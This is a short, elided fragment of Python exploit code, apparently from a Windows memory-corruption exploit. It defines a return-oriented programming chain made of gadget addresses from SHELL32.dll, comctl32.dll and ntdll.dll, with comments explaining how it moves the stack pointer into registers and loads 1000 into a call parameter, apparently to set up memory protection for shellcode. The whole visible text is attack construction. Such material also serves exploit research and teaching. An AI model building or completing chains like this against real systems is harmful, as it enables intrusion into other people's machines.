...
def create_rop_chain():
    rop_gadgets = [
        ...
        0x763bf7cb,  # PUSH ESP # POP ESI # RETN [SHELL32.dll]          ###PUT STACK POINTER IN ESI AND EAX
        ...
        0x44444444,  # padding
        ###GET 1000 in PARAMETER 4###
        0x7651250d,  # PUSH EAX # POP ESI # RETN    ** [SHELL32.dll]
        0x743ab0a3,  # MOV EBX,ESI # DEC ECX # RETN 0x04    ** [comctl32.dll]
        #0x41414141,  # padding
        #0x42424242,  # padding
        0x76212a66,  # XOR EAX,EAX # RETN    ** [SHELL32.dll]
        0x77302056,  # ADD EAX,1000 # POP ESI # RETN    ** [ntdll.dll]
        #0x43434343, # padding
        0x763cf386,  # MOV ESI,EBX # CMP AL,76 # RETN    ** [SHELL32.dll]
